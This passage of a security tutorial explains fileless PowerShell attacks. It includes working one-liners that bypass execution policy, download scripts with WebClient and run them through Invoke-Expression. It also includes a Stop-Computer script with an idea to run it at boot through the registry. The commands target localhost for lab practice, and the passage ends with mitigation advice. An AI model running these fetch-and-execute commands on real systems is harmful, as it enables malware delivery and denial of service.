  md: 'What if a systems administrator prevents execution from files that have a .ps1
    extension? No problem! Attackers can sidestep that by using the **Get-Content**
    cmdlet to access the contents of a file with another extension (there’s no way
    to filter by every possibility, which is an infinite number of extensions) and
    then send the contents to the **Invoke-Expression** cmdlet to be executed. Try
    this one:


    ```

    powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile(''http://127.0.0.1/script8.ps2'',

    ''C:\Users\%USERNAME%\Desktop\script8.ps2''); Get-Content

    ''C:\Users\%USERNAME%\Desktop\script8.ps2'' | iex

    ```


    n. Put the following in script9.ps1:


    ```

    Stop-Computer -ComputerName 127.0.0.1.

    ```


    Before you run this command, save anything that needs to be saved. This command
    is about to shut down your machine.


    An attacker can then add a registry entry that calls this file every time the
    system boots up, which will immediately make it…shut down! Now run this:


    ```

    powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile(''http://127.0.0.1/script9.ps1'',

    ''C:\Users\%USERNAME%\Desktop\script9.ps1''); iex

    ''C:\Users\%USERNAME%\Desktop\script9.ps1''

    ```


    How can we mitigate this great risk that fileless malware through PowerShell presents?


    Make sure that there is real-time monitoring of systems and networks. Make sure
    logs and alerts are in place. Make sure that updates and security patches are
    applied in a timely fashion. Make sure that the principle of least privilege is
    applied, where users and programs have just what they need to do their jobs and
    not a drop more. Make sure user education and training is provided so employees
    know what they should do and what they shouldn’t do.


    Fileless malware attacks place value on stealth, rather than persistence, though
    the flexibility of the attack to pair with other malware allows it to have both.
    The Ponemon Institute survey found that these memory-based attacks were 10 times
    more likely to succeed than file-based malware.'
